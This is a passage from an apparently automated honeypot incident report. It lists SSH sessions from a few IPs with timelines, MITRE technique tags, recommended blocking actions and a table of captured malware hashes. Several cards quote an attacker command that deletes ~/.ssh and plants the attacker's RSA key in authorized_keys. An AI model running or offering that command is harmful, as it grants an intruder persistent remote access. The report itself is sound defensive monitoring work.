| `2026-05-27 13:18:57` | `cowrie.client.version` |
| `2026-05-27 13:18:57` | `cowrie.client.kex` |
| `2026-05-27 13:18:58` | `cowrie.login.success` |
| `2026-05-27 13:18:59` | `cowrie.session.params` |
| `2026-05-27 13:18:59` | `cowrie.command.input` |
| `2026-05-27 13:18:59` | `cowrie.command.failed` |
| `2026-05-27 13:19:00` | `cowrie.log.closed` |
| `2026-05-27 13:19:00` | `cowrie.session.params` |
| `2026-05-27 13:19:00` | `cowrie.command.input` |
| `2026-05-27 13:19:00` | `cowrie.session.file_download` |
| `2026-05-27 13:19:00` | `cowrie.log.closed` |
| `2026-05-27 13:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.147.19[.]238` to AbuseIPDB if not already reported
- [ ] Block `189.147.19[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5c89207b060

| Field | Detail |
|---|---|
| **Source IP** | `189.147.19[.]238` |
| **First Seen** | 2026-05-27 13:19 |
| **Last Seen** | 2026-05-27 13:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:19:04` | `cowrie.session.connect` |
| `2026-05-27 13:19:04` | `cowrie.client.version` |
| `2026-05-27 13:19:04` | `cowrie.client.kex` |
| `2026-05-27 13:19:05` | `cowrie.login.success` |
| `2026-05-27 13:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.147.19[.]238` to AbuseIPDB if not already reported
- [ ] Block `189.147.19[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ed4f1dd2985

| Field | Detail |
|---|---|
| **Source IP** | `189.147.19[.]238` |
| **First Seen** | 2026-05-27 13:20 |
| **Last Seen** | 2026-05-27 13:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:20:42` | `cowrie.session.connect` |
| `2026-05-27 13:20:42` | `cowrie.client.version` |
| `2026-05-27 13:20:42` | `cowrie.client.kex` |
| `2026-05-27 13:20:44` | `cowrie.login.success` |
| `2026-05-27 13:20:44` | `cowrie.session.params` |
| `2026-05-27 13:20:44` | `cowrie.command.input` |
| `2026-05-27 13:20:44` | `cowrie.command.failed` |
| `2026-05-27 13:20:45` | `cowrie.log.closed` |
| `2026-05-27 13:20:45` | `cowrie.session.params` |
| `2026-05-27 13:20:45` | `cowrie.command.input` |
| `2026-05-27 13:20:46` | `cowrie.session.file_download` |
| `2026-05-27 13:20:46` | `cowrie.log.closed` |
| `2026-05-27 13:20:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.147.19[.]238` to AbuseIPDB if not already reported
- [ ] Block `189.147.19[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59e914573767

| Field | Detail |
|---|---|
| **Source IP** | `189.147.19[.]238` |
| **First Seen** | 2026-05-27 13:20 |
| **Last Seen** | 2026-05-27 13:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:20:49` | `cowrie.session.connect` |
| `2026-05-27 13:20:49` | `cowrie.client.version` |
| `2026-05-27 13:20:49` | `cowrie.client.kex` |
| `2026-05-27 13:20:50` | `cowrie.login.success` |
| `2026-05-27 13:20:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.147.19[.]238` to AbuseIPDB if not already reported
- [ ] Block `189.147.19[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e2b0672f89d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-27 13:24 |
| **Last Seen** | 2026-05-27 13:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:24:29` | `cowrie.session.connect` |
| `2026-05-27 13:24:29` | `cowrie.client.version` |
| `2026-05-27 13:24:29` | `cowrie.client.kex` |
| `2026-05-27 13:24:30` | `cowrie.login.success` |
| `2026-05-27 13:24:30` | `cowrie.session.params` |
| `2026-05-27 13:24:30` | `cowrie.command.input` |
| `2026-05-27 13:24:30` | `cowrie.command.failed` |
| `2026-05-27 13:24:30` | `cowrie.log.closed` |
| `2026-05-27 13:24:30` | `cowrie.session.params` |
| `2026-05-27 13:24:30` | `cowrie.command.input` |
| `2026-05-27 13:24:30` | `cowrie.session.file_download` |
| `2026-05-27 13:24:30` | `cowrie.log.closed` |
| `2026-05-27 13:24:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1123a1c07190

| Field | Detail |
|---|---|
| **Source IP** | `189.147.19[.]238` |
| **First Seen** | 2026-05-27 13:24 |
| **Last Seen** | 2026-05-27 13:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:24:29` | `cowrie.session.connect` |
| `2026-05-27 13:24:29` | `cowrie.client.version` |
| `2026-05-27 13:24:30` | `cowrie.client.kex` |
| `2026-05-27 13:24:31` | `cowrie.login.success` |
| `2026-05-27 13:24:31` | `cowrie.session.params` |
| `2026-05-27 13:24:31` | `cowrie.command.input` |
| `2026-05-27 13:24:31` | `cowrie.command.failed` |
| `2026-05-27 13:24:32` | `cowrie.log.closed` |
| `2026-05-27 13:24:33` | `cowrie.session.params` |
| `2026-05-27 13:24:33` | `cowrie.command.input` |
| `2026-05-27 13:24:33` | `cowrie.session.file_download` |
| `2026-05-27 13:24:33` | `cowrie.log.closed` |
| `2026-05-27 13:24:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.147.19[.]238` to AbuseIPDB if not already reported
- [ ] Block `189.147.19[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75a8f52edfb5

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-27 13:24 |
| **Last Seen** | 2026-05-27 13:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:24:32` | `cowrie.session.connect` |
| `2026-05-27 13:24:32` | `cowrie.client.version` |
| `2026-05-27 13:24:32` | `cowrie.client.kex` |
| `2026-05-27 13:24:33` | `cowrie.login.success` |
| `2026-05-27 13:24:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08eddcc3ee46

| Field | Detail |
|---|---|
| **Source IP** | `189.147.19[.]238` |
| **First Seen** | 2026-05-27 13:24 |
| **Last Seen** | 2026-05-27 13:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:24:36` | `cowrie.session.connect` |
| `2026-05-27 13:24:36` | `cowrie.client.version` |
| `2026-05-27 13:24:37` | `cowrie.client.kex` |
| `2026-05-27 13:24:38` | `cowrie.login.success` |
| `2026-05-27 13:24:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.147.19[.]238` to AbuseIPDB if not already reported
- [ ] Block `189.147.19[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cec5d4eecd8

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-27 13:26 |
| **Last Seen** | 2026-05-27 13:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:26:02` | `cowrie.session.connect` |
| `2026-05-27 13:26:02` | `cowrie.client.version` |
| `2026-05-27 13:26:02` | `cowrie.client.kex` |
| `2026-05-27 13:26:02` | `cowrie.login.success` |
| `2026-05-27 13:26:02` | `cowrie.session.params` |
| `2026-05-27 13:26:02` | `cowrie.command.input` |
| `2026-05-27 13:26:02` | `cowrie.command.failed` |
| `2026-05-27 13:26:03` | `cowrie.log.closed` |
| `2026-05-27 13:26:03` | `cowrie.session.params` |
| `2026-05-27 13:26:03` | `cowrie.command.input` |
| `2026-05-27 13:26:03` | `cowrie.session.file_download` |
| `2026-05-27 13:26:03` | `cowrie.log.closed` |
| `2026-05-27 13:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50230ffce15c

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-27 13:26 |
| **Last Seen** | 2026-05-27 13:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:26:05` | `cowrie.session.connect` |
| `2026-05-27 13:26:05` | `cowrie.client.version` |
| `2026-05-27 13:26:05` | `cowrie.client.kex` |
| `2026-05-27 13:26:05` | `cowrie.login.success` |
| `2026-05-27 13:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cc78f258620

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-27 13:29 |
| **Last Seen** | 2026-05-27 13:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:29:08` | `cowrie.session.connect` |
| `2026-05-27 13:29:08` | `cowrie.client.version` |
| `2026-05-27 13:29:08` | `cowrie.client.kex` |
| `2026-05-27 13:29:09` | `cowrie.login.success` |
| `2026-05-27 13:29:09` | `cowrie.session.params` |
| `2026-05-27 13:29:09` | `cowrie.command.input` |
| `2026-05-27 13:29:09` | `cowrie.command.failed` |
| `2026-05-27 13:29:09` | `cowrie.log.closed` |
| `2026-05-27 13:29:09` | `cowrie.session.params` |
| `2026-05-27 13:29:09` | `cowrie.command.input` |
| `2026-05-27 13:29:09` | `cowrie.session.file_download` |
| `2026-05-27 13:29:09` | `cowrie.log.closed` |
| `2026-05-27 13:29:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5481b9fed32

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-27 13:29 |
| **Last Seen** | 2026-05-27 13:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:29:11` | `cowrie.session.connect` |
| `2026-05-27 13:29:11` | `cowrie.client.version` |
| `2026-05-27 13:29:11` | `cowrie.client.kex` |
| `2026-05-27 13:29:12` | `cowrie.login.success` |
| `2026-05-27 13:29:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-320a77451c01

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-27 13:30 |
| **Last Seen** | 2026-05-27 13:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:30:47` | `cowrie.session.connect` |
| `2026-05-27 13:30:47` | `cowrie.client.version` |
| `2026-05-27 13:30:47` | `cowrie.client.kex` |
| `2026-05-27 13:30:48` | `cowrie.login.success` |
| `2026-05-27 13:30:48` | `cowrie.session.params` |
| `2026-05-27 13:30:48` | `cowrie.command.input` |
| `2026-05-27 13:30:48` | `cowrie.command.failed` |
| `2026-05-27 13:30:48` | `cowrie.log.closed` |
| `2026-05-27 13:30:48` | `cowrie.session.params` |
| `2026-05-27 13:30:48` | `cowrie.command.input` |
| `2026-05-27 13:30:48` | `cowrie.session.file_download` |
| `2026-05-27 13:30:48` | `cowrie.log.closed` |
| `2026-05-27 13:30:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f0998ad3ce5

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-27 13:30 |
| **Last Seen** | 2026-05-27 13:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:30:50` | `cowrie.session.connect` |
| `2026-05-27 13:30:50` | `cowrie.client.version` |
| `2026-05-27 13:30:50` | `cowrie.client.kex` |
| `2026-05-27 13:30:51` | `cowrie.login.success` |
| `2026-05-27 13:30:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.36.108[.]213` | **15** | 2026-05-27 13:13 | 2026-05-27 13:37 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `189.147.19[.]238` | **12** | 2026-05-27 13:01 | 2026-05-27 13:24 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.91.0[.]68` | **12** | 2026-05-27 11:21 | 2026-05-27 11:36 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `194.85.210[.]183` | **8** | 2026-05-27 11:26 | 2026-05-27 11:40 | 16m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]105` | **3** | 2026-05-27 10:41 | 2026-05-27 10:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `13.58.198[.]185` | **2** | 2026-05-27 11:20 | 2026-05-27 11:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.220.34[.]106` | **2** | 2026-05-27 11:08 | 2026-05-27 11:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]179` | **2** | 2026-05-27 10:19 | 2026-05-27 10:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.36.106[.]162` | 1 | 2026-05-27 12:09 | 2026-05-27 12:09 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.52.130[.]122` | 1 | 2026-05-27 11:31 | 2026-05-27 11:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.243.250[.]115` | 1 | 2026-05-27 11:15 | 2026-05-27 11:15 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.250.184[.]183` | 1 | 2026-05-27 10:26 | 2026-05-27 10:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.162[.]240` | 1 | 2026-05-27 13:06 | 2026-05-27 13:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.240.236[.]178` | 1 | 2026-05-27 11:32 | 2026-05-27 11:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]116` | 1 | 2026-05-27 10:23 | 2026-05-27 10:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `172.191.94[.]172` | 1 | 2026-05-27 10:01 | 2026-05-27 10:01 | 7s | 0 | `T1592` | 🟢 LOW |
| `180.167.207[.]234` | 1 | 2026-05-27 11:31 | 2026-05-27 11:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.98[.]88` | 1 | 2026-05-27 13:10 | 2026-05-27 13:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.120[.]187` | 1 | 2026-05-27 10:05 | 2026-05-27 10:07 | 92s | 0 | `T1592` | 🟢 LOW |
| `45.7.196[.]55` | 1 | 2026-05-27 13:06 | 2026-05-27 13:06 | 12s | 0 | `T1592` | 🟢 LOW |
| `54.161.61[.]47` | 1 | 2026-05-27 12:58 | 2026-05-27 12:58 | 1s | 0 | `T1592` | 🟢 LOW |
| `62.28.83[.]83` | 1 | 2026-05-27 11:58 | 2026-05-27 11:58 | 12s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]187` | 1 | 2026-05-27 11:36 | 2026-05-27 11:36 | 16s | 0 | `T1592` | 🟢 LOW |
| `88.203.20[.]57` | 1 | 2026-05-27 12:36 | 2026-05-27 12:36 | 12s | 0 | `T1592` | 🟢 LOW |
| `91.201.254[.]33` | 1 | 2026-05-27 11:08 | 2026-05-27 11:08 | 13s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]166` | 1 | 2026-05-27 10:21 | 2026-05-27 10:21 | 3s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
